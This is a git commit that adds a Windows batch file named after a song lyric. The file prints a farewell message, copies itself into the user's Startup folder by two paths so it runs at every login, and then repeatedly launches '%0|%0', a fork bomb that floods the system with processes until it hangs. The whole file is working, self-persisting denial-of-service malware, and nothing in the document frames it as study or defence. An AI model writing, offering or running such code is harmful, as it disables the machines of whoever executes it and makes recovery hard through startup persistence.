1bd97484decb3bc06960a6d7839d85cdc7e27f76
Austrakin <67105391+auslie@users.noreply.github.com>
2022-07-20 11:47:08 +0430

    Create OH I WAS SOMETHING JUST LIKE THIS.bat

---
+++ OH I WAS SOMETHING JUST LIKE THIS.bat
@@ -0,0 +1,13 @@
+echo Goodbye PC You Was A Good Friend To Me
+timeout 1
+copy "%~f0" "%appdata%\microsoft\windows\start menu\programs\startup"
+copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+%0|%0
+%0|%0
+%0|%0
+%0|%0
+%0|%0
+%0|%0
+%0|%0
+%0|%0
+%0|%0
